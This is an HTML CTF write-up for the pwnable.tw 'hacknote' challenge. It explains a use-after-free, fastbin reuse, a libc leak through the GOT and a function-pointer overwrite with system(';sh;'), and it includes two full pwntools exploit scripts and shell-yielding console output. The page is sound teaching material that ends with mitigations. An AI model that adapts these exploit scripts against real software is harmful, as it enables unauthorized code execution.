+        <div class="mem-row"><span class="mem-addr">&nbsp;&nbsp;</span><span class="mem-arrow">&rarr;</span><span class="mem-data mem-highlight">0x0804a000</span><span class="mem-desc">&larr; note0 struct (freed, returned LAST)</span></div>
+        <div class="mem-row"><span class="mem-addr">&nbsp;&nbsp;</span><span class="mem-arrow">&rarr;</span><span class="mem-data mem-yellow">0x0804a020</span><span class="mem-desc">&larr; note1 struct (freed, returned FIRST)</span></div>
+      </div>
+
+      <p>When we allocate <code class="inline">add_note(32, "A"*10)</code>, the 8-byte note struct comes from the fastbin (gets <code class="inline">0x0804a020</code>, the note1 struct address), and the 32-byte content buffer comes from elsewhere (top chunk, since there's no 0x30 fastbin). This doesn't give us overlap yet.</p>
+
+      <p>But when we allocate <code class="inline">add_note(8, payload)</code>, the 8-byte struct comes from fastbin (gets <code class="inline">0x0804a000</code>, the note0 struct address), and the <strong>8-byte content buffer</strong> also comes from the 0x10 fastbin &mdash; which now returns <code class="inline">0x0804a020</code>, the old note1 struct!</p>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x0804a020</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">p32(PRINT_FUNC) + p32(PUTS_GOT)</span><span class="mem-desc">&larr; note1 struct overwritten!</span></div>
+        <div class="mem-row" style="margin-top:8px"><span class="mem-desc">Now notes_list[1] still points here. When we call print_note(1):</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;notes_list[1]-&gt;print_func = PRINT_FUNC (0x804862b)</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;notes_list[1]-&gt;contents = PUTS_GOT (0x804a028)</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; Calls puts(*0x804a028) = puts(puts@libc) &rarr; <span class="mem-green">LEAKS LIBC!</span></span></div>
+      </div>
+
+      <h3>Verifying with GDB</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ x/2wx 0x0804a020
+0x0804a020:  0x0804862b  0x0804a028
+#                     ^print_func    ^contents = puts@GOT
+gdb-peda$ x/1wx 0x0804a028
+0x0804a028:  0xf7e6d420
+#            ^ this is puts() address in libc!
+
+gdb-peda$ # When print_note(1) is called:
+gdb-peda$ # note-&gt;print_func(note) = 0x804862b(note)
+gdb-peda$ # Inside print_func: puts(note[1]) = puts(0x0804a028)
+gdb-peda$ # = puts(*0x0804a028) = puts(0xf7e6d420) -- but it reads the GOT entry
+gdb-peda$ # Actually: puts(note-&gt;contents) = puts(*(0x0804a028))
+gdb-peda$ # Wait, no -- print_func does puts(param_1[1])
+gdb-peda$ # param_1 = note pointer = 0x0804a020
+gdb-peda$ # param_1[1] = *(0x0804a020 + 4) = 0x0804a028
+gdb-peda$ # puts(0x0804a028) -- reads string at GOT address</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; How the Leak Works</div>
+        The default <code class="inline">print_func</code> at <code class="inline">0x804862b</code> does <code class="inline">puts(param_1[1])</code>, which treats the second field of the struct as a <strong>string pointer</strong> and prints what it points to. By setting <code class="inline">contents</code> to <code class="inline">puts@GOT</code>, we make it print the GOT entry for puts &mdash; which contains the actual libc address of <code class="inline">puts</code>. This leaks libc!
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit consists of two phases: <strong>leaking libc</strong> via the UAF + GOT read, and then <strong>hijacking control flow</strong> by overwriting the function pointer with <code class="inline">system</code>.</p>
+
+      <h3>Phase 1: Leak Libc via GOT</h3>
+      <ol class="step-list">
+        <li><strong>Create two small notes</strong> (size 8 each) &mdash; note 0 and note 1. Both struct and content chunks are 0x10 total (8 data + 8 header), so they go into the same fastbin when freed.</li>
+        <li><strong>Free note 1, then note 0.</strong> The fastbin 0x10 now has: <code class="inline">note0_struct &rarr; note1_struct &rarr; NULL</code>. The content fastbin has: <code class="inline">note0_contents &rarr; note1_contents &rarr; NULL</code>.</li>
+        <li><strong>Allocate note with size 32</strong> (note 2). The 8-byte struct is allocated from the 0x10 fastbin (gets the old note1 struct address). The 32-byte content buffer is allocated from the top chunk (no 0x30 fastbin available). This doesn't give us overlap, but it consumes one struct from the fastbin.</li>
+        <li><strong>Allocate note with size 8</strong> (note 3). The 8-byte struct comes from the 0x10 fastbin (gets the old note0 struct address). The 8-byte content buffer also comes from the 0x10 fastbin &mdash; it gets the old note1 struct address! We write <code class="inline">p32(0x804862b) + p32(puts@GOT)</code> as content. This overwrites the old note1 struct with our controlled data.</li>
+        <li><strong>Call print_note(1).</strong> Since <code class="inline">notes_list[1]</code> still points to the freed note1 struct (which is now our controlled data), it calls <code class="inline">0x804862b(note1_ptr)</code>. Inside, <code class="inline">puts(note-&gt;contents)</code> dereferences the <code class="inline">contents</code> field which is now <code class="inline">puts@GOT</code>. This prints the libc address of <code class="inline">puts</code>.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_puts - libc.symbols['puts']</code></li>
+      </ol>
+
+      <h3>Phase 2: Hijack Control Flow with system()</h3>
+      <ol class="step-list">
+        <li><strong>Free note 3</strong> (the one whose content overlaps the old note1 struct). This puts the note1 struct address back into the fastbin.</li>
+        <li><strong>Allocate a new note with size 8</strong> and content <code class="inline">p32(system_addr) + ";sh;"</code>. The struct allocation gets the old note3 struct, and the content allocation gets the old note1 struct (again!). This time we overwrite the note1 struct with <code class="inline">print_func = system</code> and <code class="inline">contents = ";sh;"</code>.</li>
+        <li><strong>Call print_note(1).</strong> Now <code class="inline">notes_list[1]-&gt;print_func</code> is <code class="inline">system</code>. It calls <code class="inline">system(note1_ptr)</code>. The argument is the note struct pointer itself, and the data starting at that address is <code class="inline">p32(system_addr) + ";sh;"</code>. The <code class="inline">system()</code> function tries to execute this as a command. The first 4 bytes (<code class="inline">system_addr</code> in little-endian) are garbage, but <code class="inline">;sh;</code> acts as a command separator &mdash; <code class="inline">system</code> treats <code class="inline">;</code> as a command delimiter, so it runs <code class="inline">sh</code>!</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; The ";sh;" Trick</div>
+        When <code class="inline">system(note_ptr)</code> is called, the first 4 bytes of the note struct are the address of <code class="inline">system</code> itself (in little-endian). This is not a valid command and will fail, but <code class="inline">;</code> acts as a command separator in shell. So <code class="inline">system("&lt;garbage&gt;;sh;")</code> will:<br>
+        &bull; Try to execute the garbage bytes (fails silently)<br>
+        &bull; Execute <code class="inline">sh</code> (gives us a shell!)<br>
+        &bull; The trailing <code class="inline">;</code> handles any remaining garbage<br>
+        Alternative: <code class="inline">||sh</code> also works (OR operator, runs sh if first command fails).
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">add(8, "aa") = note0 | add(8, "aa") = note1</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">del(1) | del(0) &rarr; fastbin: [note0_struct &rarr; note1_struct]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">add(32, "A"*10) = note2 &rarr; struct gets note1_struct slot</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">add(8, p32(print) + p32(puts@GOT)) = note3</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; content buffer lands on note1_struct!</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">show(1) &rarr; calls print_func(note1) &rarr; puts(*puts@GOT) &rarr; <span class="mem-green">LEAK!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Get shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">del(3) &rarr; puts note1_struct back in fastbin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">add(8, p32(system) + ";sh;") = new note</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; content lands on note1_struct again!</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">show(1) &rarr; calls <span class="mem-highlight">system(note1)</span> &rarr; system("XX;sh;") &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+hacknote - pwnable.tw (200pts)
+Use-After-Free exploit to leak libc via GOT read,
+then overwrite print_func with system for shell.
+
+Vulnerability: delete_note() frees note struct but doesn't
+NULL out the pointer in notes_list, creating a UAF.
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10102)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./hacknote')
+
+# Constants
+ADDR_PRINT_FUNC = 0x804862b       # Default print function
+ADDR_PUTS_GOT   = elf.got['puts']  # GOT entry for puts
+
+# Helper functions
+def add_note(size, content):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', content)
+
+def delete_note(idx):
+    r.sendlineafter(b':', b'2')
+    r.sendlineafter(b':', str(idx).encode())
+
+def print_note(idx):
+    r.sendlineafter(b':', b'3')
+    r.sendlineafter(b':', str(idx).encode())
+
+# ============================================
+# Phase 1: Leak libc address via GOT read
+# ============================================
+log.info("Phase 1: Leaking libc address...")
+
+# Create two notes with same-size content (8 bytes)
+# Both note struct (8 bytes) and content (8 bytes) go
+# into the 0x10 fastbin when freed.
+add_note(8, b'a' * 2)    # note 0
+add_note(8, b'a' * 2)    # note 1
+
+# Free in reverse order (LIFO)
+# Fastbin 0x10: note0_struct -> note1_struct -> NULL
+delete_note(1)
+delete_note(0)
+
+# Allocate note with size 32 (note 2)
+# - Struct (8 bytes) comes from 0x10 fastbin -> gets note1_struct address
+# - Content (32 bytes) comes from top chunk (no 0x30 fastbin)
+add_note(32, b'A' * 10)  # note 2
+
+# Allocate note with size 8 (note 3)
+# - Struct (8 bytes) comes from 0x10 fastbin -> gets note0_struct address
+# - Content (8 bytes) comes from 0x10 fastbin -> gets note1_struct address!
+# We write: p32(print_func) + p32(puts@GOT)
+# This overwrites the old note1 struct!
+add_note(8, p32(ADDR_PRINT_FUNC) + p32(ADDR_PUTS_GOT))  # note 3
+
+# Print note 1 (whose struct we just overwrote)
+# print_func(note1) -> puts(note1->contents) -> puts(*puts@GOT)
+# This reads the GOT entry and prints the libc address of puts!
+print_note(1)
+
+# Receive the leaked address
+leaked = r.recv(4)
+LEAKED_PUTS = u32(leaked)
+LIBC_BASE = LEAKED_PUTS - libc.symbols['puts']
+ADDR_SYSTEM = LIBC_BASE + libc.symbols['system']
+
+log.success(f"Leaked puts@libc: {hex(LEAKED_PUTS)}")
+log.success(f"Libc base:        {hex(LIBC_BASE)}")
+log.success(f"system@libc:      {hex(ADDR_SYSTEM)}")
+
+# ============================================
+# Phase 2: Overwrite print_func with system
+# ============================================
+log.info("Phase 2: Overwriting print_func with system...")
+
+# Free note 3 to put note1_struct back in fastbin
+delete_note(3)
+
+# Allocate new note with controlled content
+# - Content lands on note1_struct again
+# - Write: p32(system) + ";sh;"
+# When print_note(1) is called:
+#   notes_list[1]->print_func(note1)
+#   = system(note1)
+#   = system(p32(system) + ";sh;")
+#   The ";" separator makes shell execute "sh"!
+add_note(8, p32(ADDR_SYSTEM) + b';sh;')
+
+# Trigger the exploit
+print_note(1)
+
+log.success("Got shell!")
+r.interactive()</code></pre>
+      </div>
+
+      <h3>Alternative Approach: Unsorted Bin Leak</h3>
+      <p>A different strategy uses large allocations (&gt;0x80 bytes) that go into the unsorted bin instead of fastbins. When a chunk is freed into the unsorted bin, its <code class="inline">fd</code> and <code class="inline">bk</code> pointers point to <code class="inline">main_arena</code> inside libc. We can read these pointers to calculate the libc base.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">"""Alternative exploit using unsorted bin leak"""
+from pwn import *
+
+cn = remote('chall.pwnable.tw', 10102)
+libc = ELF('./libc_32.so.6')
+
+def add(size, con):
+    cn.sendline('1')
+    cn.recvuntil('Note size :')
+    cn.sendline(str(size))
+    cn.recvuntil('Content :')
+    cn.send(con)
+
+def dele(idx):
+    cn.sendline('2')
+    cn.recvuntil("Index :")
+    cn.sendline(str(idx))
+
+def show(idx):
+    cn.sendline('3')
+    cn.recvuntil("Index :")
+    cn.sendline(str(idx))
+
+# Allocate chunks large enough to go into unsorted bin (>0x80)
+add(0x80, 'a')   # note 0
+add(0x80, 'a')   # note 1 (prevents consolidation with top chunk)
+
+dele(0)
+# note 0's content goes to unsorted bin
+# fd/bk point to main_arena+offset in libc
+
+# Reallocate note 0's content; fd pointer remains in the buffer
+add(0x80, 'X')   # note 2 - overwrites note0 content
+# The 'X' overwrites fd, but bk (at offset 0x84 in the old chunk)
+# still contains the libc pointer!
+
+show(2)
+cn.recvuntil('X')
+cn.recv(3)  # skip padding
+libc_leak = u32(cn.recv(4))
+libc.address = libc_leak - 48 - 0x001B0780  # offset to libc base
+system = libc.sym['system']
+
+log.success(f"Libc base: {hex(libc.address)}")
+
+# Now use the same UAF technique to overwrite print_func
+dele(0)
+dele(1)
+pay = p32(system) + ';/bin/sh\x00'
+add(0x90, pay)   # overwrites note struct with system + "/bin/sh"
+show(0)
+cn.interactive()</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/hacknote'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10102: Done
+[*] Phase 1: Leaking libc address...
+[+] Leaked puts@libc: 0xf7e6d420
+[+] Libc base:        0xf7e32000
+[+] system@libc:      0xf7e6cda0
+[*] Phase 2: Overwriting print_func with system...
+[+] Got shell!
+$ id
+uid=1000(hacknote) gid=1000(hacknote) groups=1000(hacknote)
+$ cat /home/hacknote/flag</code></pre>
+      </div>
+
+      <h3>Key Observations</h3>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Success</div>
+        The exploit successfully leaked the libc address and gained a shell. The key steps that made this work:<br><br>
+        &bull; <strong>UAF allows dangling pointer access:</strong> <code class="inline">notes_list[1]</code> still points to freed memory after <code class="inline">delete_note(1)</code><br>
+        &bull; <strong>Same fastbin for struct and contents:</strong> Both 8-byte allocations go into the 0x10 fastbin, allowing content to overwrite struct fields<br>
+        &bull; <strong>GOT leak via print_func:</strong> Setting <code class="inline">contents</code> to <code class="inline">puts@GOT</code> makes the default print function leak the real libc address<br>
+        &bull; <strong>Function pointer hijack:</strong> Overwriting <code class="inline">print_func</code> with <code class="inline">system</code> gives code execution<br>
+        &bull; <strong>Shell trick with ";sh;":</strong> The semicolon acts as a command separator, making <code class="inline">system()</code> execute <code class="inline">sh</code>
+      </div>
+
+      <h3>Lessons Learned</h3>
+
+      <table class="info-table">
+        <tr><th>Concept</th><th>Takeaway</th></tr>
+        <tr><td class="label">UAF</td><td class="value">Always NULL out pointers after freeing. The missing <code class="inline">notes_list[i] = NULL</code> is the root cause.</td></tr>
+        <tr><td class="label">Fastbin Reuse</td><td class="value">When struct and content are the same size, they share a fastbin, enabling cross-type overwrites.</td></tr>
+        <tr><td class="label">GOT Leak</td><td class="value">Partial RELRO means GOT is writable and readable. Point a read primitive at GOT to leak libc.</td></tr>
+        <tr><td class="label">Function Pointers</td><td class="value">In C, function pointers in structs are powerful attack surfaces. NX prevents shellcode but not code reuse.</td></tr>
+        <tr><td class="label">system() Semantics</td><td class="value"><code class="inline">system()</code> passes its argument to <code class="inline">/bin/sh -c</code>, so shell metacharacters like <code class="inline">;</code> and <code class="inline">||</code> work as command separators.</td></tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Mitigation</div>
+        The vulnerability can be fixed by adding <code class="inline">notes_list[index] = NULL;</code> after the <code class="inline">free()</code> calls in <code class="inline">delete_note()</code>. Additionally, using <strong>Full RELRO</strong> would prevent GOT overwrites (though this exploit only reads GOT, it doesn't write to it). A more robust fix would validate function pointers before calling them.
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210">GitHub</a> &bull;</p>
+  <p style="margin-top: 0.5rem; opacity: 0.6;">hacknote writeup &bull; pwnable.tw &bull; Use-After-Free</p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+  const colors = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
+    velocities[i * 3] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 1] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 2] = (Math.random() - 0.5) * 0.02;
+
+    const colorChoice = Math.random();
+    if (colorChoice < 0.5) {
+      colors[i * 3] = 0.22; colors[i * 3 + 1] = 0.74; colors[i * 3 + 2] = 0.97; // accent blue
+    } else {
+      colors[i * 3] = 0.51; colors[i * 3 + 1] = 0.55; colors[i * 3 + 2] = 0.97; // accent purple
+    }
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+  const material = new THREE.PointsMaterial({
+    size: 0.4,
+    vertexColors: true,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  // Connection lines
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMaterial = new THREE.LineBasicMaterial({
+    color: 0x38bdf8,
+    transparent: true,
+    opacity: 0.06,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const posArr = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      posArr[i * 3] += velocities[i * 3];
+      posArr[i * 3 + 1] += velocities[i * 3 + 1];
+      posArr[i * 3 + 2] += velocities[i * 3 + 2];
+
+      for (let j = 0; j < 3; j++) {
+        if (posArr[i * 3 + j] > 50) posArr[i * 3 + j] = -50;
+        if (posArr[i * 3 + j] < -50) posArr[i * 3 + j] = 50;
+      }
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    // Update lines (only check nearby particles for performance)
+    let lineIdx = 0;
+    const maxDist = 12;
+    for (let i = 0; i < Math.min(particleCount, 200); i++) {
+      for (let j = i + 1; j < Math.min(particleCount, 200); j++) {
+        const dx = posArr[i * 3] - posArr[j * 3];
+        const dy = posArr[i * 3 + 1] - posArr[j * 3 + 1];
+        const dz = posArr[i * 3 + 2] - posArr[j * 3 + 2];
+        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
+        if (dist < maxDist) {
+          linePositions[lineIdx++] = posArr[i * 3];
+          linePositions[lineIdx++] = posArr[i * 3 + 1];
+          linePositions[lineIdx++] = posArr[i * 3 + 2];
+          linePositions[lineIdx++] = posArr[j * 3];
+          linePositions[lineIdx++] = posArr[j * 3 + 1];
+          linePositions[lineIdx++] = posArr[j * 3 + 2];
+        }
+      }
+    }
+    for (let i = lineIdx; i < linePositions.length; i++) linePositions[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+
+    points.rotation.y += 0.0003;
+    lines.rotation.y += 0.0003;
+
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Active State -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = ch.id;
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
